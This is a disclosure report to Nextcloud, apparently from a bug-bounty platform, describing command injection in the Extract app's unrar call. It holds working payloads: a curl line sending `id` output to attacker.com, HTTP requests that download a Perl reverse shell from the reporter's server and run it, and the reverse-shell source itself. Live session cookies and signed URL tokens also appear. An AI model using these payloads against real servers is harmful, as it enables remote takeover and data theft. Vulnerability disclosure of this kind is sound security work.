{
  "reported_to": "Nextcloud",
  "reported_by": "hdbreaker ",
  "title": "Remote Code Execution via Extract App Plugin",
  "content": "\nHi, I found a critical issue in the Add-on \"Extract\" listed in the Nextcloud Marketplace: https://apps.nextcloud.com/apps/extract (This extension can be installed directly from Nextcloud Application)\nThe vulnerability was found in file: extract/lib/Controller/ExtractionController.php line 102.\nThe affected code can be seen below:\nCode 887 Bytes\n1if (extension_loaded (\"rar\")){\n2\t\t\t\t$rar_file = rar_open($file);\n3\t\t\t\t$list = rar_list($rar_file);\n4\t\t\t\tvar_dump($rar_file);\n5\t\t\t\tforeach($list as $fileOpen) {\n6\t\t\t\t\t$entry = rar_entry_get($rar_file, $fileOpen->getName());\n7\t\t\t\t\t$entry->extract($dir); // extract to the current dir\n8\t\t\t\t\tself::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fileOpen->getName());\n9\t\t\t\t}\n10\t\t\t\trar_close($rar_file); \n11\t\t\t}else{\n12                ######## BUG HERE #########\n13\t\t\t\texec(\"unrar x \\\"\".$file.\"\\\" -R \\\"\".$dir.\"\\\" -o+\",$output,$return);\n14                #########################\n15\t\t\t\tforeach ($output as $val ) {\n16\t\t\t\t\tif(preg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[0] == \"Extracting\" && \n17\t\t\t\t\tpreg_split('/ /', $val, -1, PREG_SPLIT_NO_EMPTY)[1] != \"from\"){\n18\t\t\t\t\t\t$fichier = substr(strrchr($PATH, \"/\"), 1);\n19\t\t\t\t\t\tself::scanFolder('/'.$this->UserId.'/files'.$directory.'/'.$fichier);\n20\t\t\t\t\t}\n21\t\t\t\t}\n22\t\t\t}\nThe unrar line allows Command Injection via $file and $dir parameters, an attacker could use the following payload in order to exploit a Remote Command Execution in a Nextcloud Server and exfiltrate data via Curl requests.\nCode 95 Bytes\n1nameOfFile=sample.rar\"|curl www.attacker.com:443/data?id=$(id | base64)|\"&directory=&external=0\nAbusing this issue I was able to take full control of the demo instance: https://demo.nextcloud.com/lun0shai/\nThe steps to reproduce this PoC can be seen below:\n1) Create a demo instance in https://demo.nextcloud.com and login.\n2) Install the plugin Extract directly from the Apps menu:\n<image_0>\n3) Once the Add-on is installed, the attacker needs to upload a sample.rar file:\n<image_1>\n4) Then, the attacker needs to use the functionality \"Extract Here\" from the context menu and intercept the HTTP Request with BurpSuite:\n<image_2>\n<image_3>\n5) At this point, the attacker can manipulate the $nameOfFile and & $dir parameters to achieve Remote Code Execution in the Nextcloud Instance. This PoC of RCE was performed over a Demo Instance running the latest version of NextClou.\nTo achieve RCE over Demo Instance 2 payloads were needed:\na) The attacker needs to force the application to download a Perl Reverse Shell to /tmp folder using curl, this was achieved using the following HTTP Request:\nNote:\nMy server IP is: 138.68.1.244\nHTTP Request:\nCode 989 Bytes\n1POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1\n2Host: demo.nextcloud.com\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n8requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=\n9OCS-APIREQUEST: true\n10X-Requested-With: XMLHttpRequest\n11Content-Length: 98\n12Connection: close\n13Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v\n14\n15nameOfFile=sample.rar\"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|\"&directory=&external=0\nHTTP Response:\nCode 910 Bytes\n1HTTP/1.1 200 OK\n2Date: Tue, 23 Apr 2019 08:24:50 GMT\n3Server: Apache\n4Strict-Transport-Security: max-age=15768000\n5Expires: Thu, 19 Nov 1981 08:52:00 GMT\n6Cache-Control: no-cache, no-store, must-revalidate\n7Pragma: no-cache\n8Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';script-src 'nonce-bXBVNko3dWtWZnFVMzl3QnpTMHBlSkwvYlhhSWtLczZXelhlTFRkMGNJdz06L3ZsUFFOU1FlcEQ2dkkxQW9YNVlPL2lMSFFHNjVwTnFId3lUSGxnQ0tiZz0=';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self' data:;connect-src 'self' stun.nextcloud.com:443;media-src 'self';frame-src https://demo.nextcloud.com\n9X-Frame-Options: SAMEORIGIN\n10Content-Length: 4\n11X-Content-Type-Options: nosniff\n12X-XSS-Protection: 1; mode=block\n13X-Robots-Tag: none\n14X-Download-Options: noopen\n15X-Permitted-Cross-Domain-Policies: none\n16Referrer-Policy: no-referrer\n17Content-Type: application/json; charset=utf-8\n18Connection: close\n19\n20null\nThe above request wrote the following reverse shell in /tmp/shell.pl\nCode 209 Bytes\n1use Socket;$i=\"138.68.1.244\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\n<image_4>\nb) A second HTTP Request was needed to execute the Perl Reverse Shell and gain full shell access over the remote server (demo.nextcloud.com):\nHTTP Request:\nCode 957 Bytes\n1POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1\n2Host: demo.nextcloud.com\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n8requesttoken: v+/28PW5/gilVA9we7iR7yrAYLjQCiYpfyx4e+jIdPU=:24ODl5qN0WLLN14xF+vgrEC0EM/ifB55OxU1SIe+LcE=\n9OCS-APIREQUEST: true\n10X-Requested-With: XMLHttpRequest\n11Content-Length: 66\n12Connection: close\n13Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lbdC6UlHe0FkyVXeu5e2gA%2FOloJaUrRkXAb8sDLgF2pQYpUh1NlHeS8rpppQZakBiTH3K9%2FwWAytej%2FCTkV9%2FurYyRaMVQWLbAyu; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=eGciTpRb4Bu7DpG2ohUjUWhAd%2BjQGRbb; nc_session_id=aashsh75p508m9qk0tdq0ahk8v\n14\n15nameOfFile=sample.rar\"|perl /tmp/shell2.pl|\"&directory=&external=0\nAfter these steps, my Server (IP: 138.68.1.244) received the Reverse Shell successfully and I was able to move freely over the Docker Instance of Nextcloud, reading even the config file as can be seen below:\n<image_5>\n<image_6>\nHope this could help to improve your security and check continuously the Applications that you spread using your market.\nPlease do not hesitate to contact me if you need any help to detect/resolve this issue.\nRegards,\nImpact\nAn authenticated user could use the Extract Plugin listed in the Apps Market of Nextcloud to achieve Remote Code Execution in any Nextcloud instance.\n\n",
  "severity": [
    8.4,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/350/2c5d874ad557e1c8b8d35ac75ef5f190eb76dbaf/Screen_Shot_2019-04-23_at_5.41.35_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.41.35_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.41.35_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=92048f5ecbfc78f03bc70861d4f28a156cf8e3370113e4698848adc31d6043bd",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/351/9b64b8f2c765b6a540d7ea3557dc728bbfe37659/Screen_Shot_2019-04-23_at_5.43.18_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.43.18_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.43.18_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c0f4cd397cdd287067824409d545768799c33cd1648c3143596bf65c6281d9c2",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/352/47328d1a2e61d31a4535f6d93fcbe8dfac5919bf/Screen_Shot_2019-04-23_at_5.43.39_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.43.39_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.43.39_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ec718330f12623f03f8fbcce4cb3583e83fd5dfd45a648c4c6d92bbc963fce4",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/356/1eae964f28b69f1c16a8858bbc6de99a3a575a5c/Screen_Shot_2019-04-23_at_5.47.40_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.47.40_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.47.40_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce9a944824cbe7aa0e3fc1083697a4d3392fd514d67a48977eeb1a3d65dc142f",
    "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/360/e3602b08d1c769e8390eb9dabf85b6cc9bc5433c/Screen_Shot_2019-04-23_at_5.51.48_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.51.48_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.51.48_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=82aeae8a81c08a3e95c9d3b1de5d021dc5f6146fbdafad5cac8f459342a61eba",
    "image_5": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/474/361/01511e5bc928594348ec04b2dd96ff33163b7032/Screen_Shot_2019-04-23_at_5.54.31_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-04-23_at_5.54.31_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-04-23_at_5.54.31_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T042024Z&X-Amz-Expires=2771&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ffc5df323fe51e254c313432668978904596c70064a0ea9ed939b7b724fc92a",
